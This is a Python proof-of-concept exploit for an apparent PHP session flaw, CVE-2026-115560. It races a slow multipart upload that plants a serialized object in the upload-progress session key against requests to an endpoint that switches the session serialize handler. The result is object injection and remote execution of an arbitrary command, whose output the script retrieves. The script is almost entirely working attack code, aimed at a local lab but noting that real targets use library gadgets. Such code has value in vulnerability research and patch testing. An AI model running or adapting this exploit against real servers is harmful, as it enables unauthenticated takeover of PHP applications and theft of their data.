#!/usr/bin/env python3
"""
PoC for CVE-2026-115560 — PHP session upload progress + runtime
serialize_handler switch => unauthenticated object injection / RCE.

Advisory preconditions (php.net, 2026-10-23):
  1. session.serialize_handler = php_binary | php_serialize in server config
  2. the application ini_set()s it to "php" at runtime before session_start()
  3. session.upload_progress.enabled = 1 (PHP default)

Exploit mechanics (verified against php-src PHP-8.4 ext/session/session.c):
  * A multipart POST carrying PHPSESSID (accepted from the POST body by the
    rfc1867 handler regardless of session.use_only_cookies) plus a
    PHP_SESSION_UPLOAD_PROGRESS field makes PHP write an
    "upload_progress_<value>" key into the session file BEFORE the script
    runs. The write uses the SERVER-configured handler (php_serialize).
    The field value is stored raw — no sanitization, '|' allowed.
  * The payload value is "|<serialized object>". php_serialize is
    length-prefixed, so the '|' is harmless on write.
  * A concurrent request hits the app, which switches the handler to "php"
    and calls session_start(). The "php" handler decodes "key|serialized"
    pairs and splits at the FIRST '|' — inside our payload — so
    unserialize() runs on attacker data: arbitrary object instantiation.
    __destruct fires even though the overall decode returns FAILURE
    (PHP_VAR_UNSERIALIZE_DESTROY runs on both paths).
  * session.upload_progress.cleanup=1 (default) deletes the key when the
    upload ENDS, so the consumer must read WHILE the upload is in flight.
    The files save handler only holds flock() around each brief flush, so
    concurrent reads of the same session file succeed during the upload.
    The producer throttles a multi-MB upload to keep the window wide open.

Usage:
  python3 poc.py check    --target http://127.0.0.1:8094
  python3 poc.py exploit  --target http://127.0.0.1:8094 [--cmd "id"] [-v]

Only Python stdlib is used. Lab: ./lab.sh up
"""

import argparse
import http.client
import json
import secrets
import socket
import sys
import threading
import time

GADGET_CLASS = "LabGadget"          # defined by lab/src/*.php; real targets use library gadgets
RESULT_DIR = "/var/www/html/p"      # writable drop dir inside the lab container


def build_payload(cmd: str) -> str:
    """Session-key payload: '|' + serialized LabGadget. The value lands inside
    the session array key 'upload_progress_<payload>'."""
    obj = f'O:{len(GADGET_CLASS)}:"{GADGET_CLASS}":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'
    return "|" + obj


def http_get(host, port, path, cookie=None, timeout=5):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {}
    if cookie:
        headers["Cookie"] = cookie
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    status, body = resp.status, resp.read()
    conn.close()
    return status, body


def producer(host, port, path, sid, payload, file_bytes, delay, stop, verbose, errors):
    """Slow multipart upload: PHPSESSID (POST field) + PHP_SESSION_UPLOAD_PROGRESS
    (payload) + one large file, trickled out so the rfc1867-flushed session file
    keeps the malicious key alive for the whole window."""
    boundary = "----cve115560" + secrets.token_hex(8)
    pre = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{payload}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="legit.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    post = f"\r\n--{boundary}--\r\n".encode()
    total = len(pre) + file_bytes + len(post)
    head = (
        f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {total}\r\nConnection: close\r\n\r\n"
    ).encode()
    try:
        sock = socket.create_connection((host, port), timeout=10)
        sock.sendall(head + pre)
        if verbose:
            print(f"[producer] upload started: sid={sid} total={total}B "
                  f"(payload flushed to sess_{sid} at FILE_START)")
        chunk = b"A" * 16384
        sent = 0
        while sent < file_bytes and not stop.is_set():
            n = min(len(chunk), file_bytes - sent)
            sock.sendall(chunk[:n])
            sent += n
            time.sleep(delay)
        if not stop.is_set():
            sock.sendall(post)
        sock.settimeout(5)
        try:
            while sock.recv(65536):
                pass
        except OSError:
            pass
        sock.close()
        if verbose:
            print(f"[producer] upload finished ({sent}/{file_bytes} file bytes sent)")
    except OSError as exc:
        errors.append(f"producer: {exc}")


def consumer(host, port, path, sid, stop, hits, verbose):
    """Repeatedly read the session file through the handler-switching app."""
    while not stop.is_set():
        try:
            http_get(host, port, path, cookie=f"PHPSESSID={sid}", timeout=5)
            hits[0] += 1
        except OSError:
            time.sleep(0.05)


def cmd_check(args):
    host, port = args.host, args.port
    try:
        status, body = http_get(host, port, "/info.php")
    except OSError as exc:
        print(f"[-] target unreachable: {exc}")
        return 2
    if status != 200:
        print(f"[-] /info.php -> HTTP {status}")
        return 2
    info = json.loads(body)
    print(f"[*] target:  http://{host}:{port}")
    print(f"[*] php:     {info['php_version']} ({info['sapi']})")
    for k in ("serialize_handler_global", "upload_progress_enabled",
              "upload_progress_cleanup", "use_only_cookies", "use_strict_mode"):
        print(f"[*] {k:26s} = {info[k]}")
    ok = (info["serialize_handler_global"] in ("php_serialize", "php_binary")
          and str(info["upload_progress_enabled"]) in ("1", "On", "on"))
    print()
    if ok:
        print("[+] PRECONDITIONS MET (server side): php_serialize/php_binary config "
              "+ upload_progress enabled.")
        print("    Exploitable iff an endpoint switches the handler to 'php' at "
              "runtime before session_start() — /index.php in this lab does.")
        return 0
    print("[-] preconditions NOT met on server side (mitigated or wrong handler).")
    return 1


def cmd_exploit(args):
    host, port = args.host, args.port
    token = secrets.token_hex(6)
    sid = secrets.token_hex(16)                      # valid key chars: [a-f0-9]
    wrapped = f"({args.cmd}) > {RESULT_DIR}/{token} 2>&1"
    payload = build_payload(wrapped)
    file_bytes = args.file_mb * 1024 * 1024
    delay = args.delay

    print(f"[*] target    : http://{host}:{port}{args.path}")
    print(f"[*] session id: {sid}")
    print(f"[*] cmd       : {args.cmd}")
    print(f"[*] payload   : {payload}")
    print(f"[*] window    : ~{file_bytes // 16384 * delay:.0f}s "
          f"({args.file_mb} MiB throttled at {delay}s/16KiB)")

    stop = threading.Event()
    hits = [0]
    errors = []
    t_prod = threading.Thread(target=producer,
                              args=(host, port, args.path, sid, payload,
                                    file_bytes, delay, stop, args.verbose, errors),
                              daemon=True)
    t_cons = threading.Thread(target=consumer,
                              args=(host, port, args.path, sid, stop, hits, args.verbose),
                              daemon=True)
    t0 = time.time()
    t_prod.start()
    t_cons.start()

    result = None
    while time.time() - t0 < args.timeout:
        try:
            status, body = http_get(host, port, f"/p/{token}", timeout=3)
            if status == 200:
                result = body.decode(errors="replace")
                break
        except OSError:
            pass
        if not t_prod.is_alive() and hits[0] > 0:
            time.sleep(0.5)   # producer done; allow one last grace poll
        time.sleep(0.25)

    stop.set()
    t_prod.join(timeout=3)
    t_cons.join(timeout=3)

    print()
    if result is not None:
        print(f"[+] RCE CONFIRMED after {time.time() - t0:.1f}s "
              f"({hits[0]} consumer reads)")
        print(f"[+] proof: http://{host}:{port}/p/{token}")
        print("----- command output -----")
        print(result.rstrip() or "(empty)")
        print("--------------------------")
        return 0

    print(f"[-] no result within {args.timeout}s "
          f"({hits[0]} consumer reads, errors: {errors or 'none'})")
    print("    expected on the mitigated target (upload_progress.enabled=0)")
    print("    and on /noswitch.php (no runtime handler switch).")
    return 1


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="mode", required=True)
    for name in ("check", "exploit"):
        p = sub.add_parser(name)
        p.add_argument("--target", default="http://127.0.0.1:8094",
                       help="base URL (default: http://127.0.0.1:8094)")
    for name, p in (("exploit", sub.choices["exploit"]),):
        p.add_argument("--path", default="/index.php",
                       help="handler-switching endpoint (default: /index.php; "
                            "use /noswitch.php as negative control)")
        p.add_argument("--cmd", default="id", help="command to run (default: id)")
        p.add_argument("--file-mb", type=int, default=4,
                       help="producer upload size in MiB (default: 4)")
        p.add_argument("--delay", type=float, default=0.15,
                       help="seconds between 16KiB chunks (default: 0.15)")
        p.add_argument("--timeout", type=int, default=90,
                       help="overall timeout seconds (default: 90)")
        p.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    t = args.target.replace("http://", "").replace("https://", "").rstrip("/")
    args.host, _, prt = t.partition(":")
    args.port = int(prt or 80)

    return cmd_check(args) if args.mode == "check" else cmd_exploit(args)


if __name__ == "__main__":
    sys.exit(main())
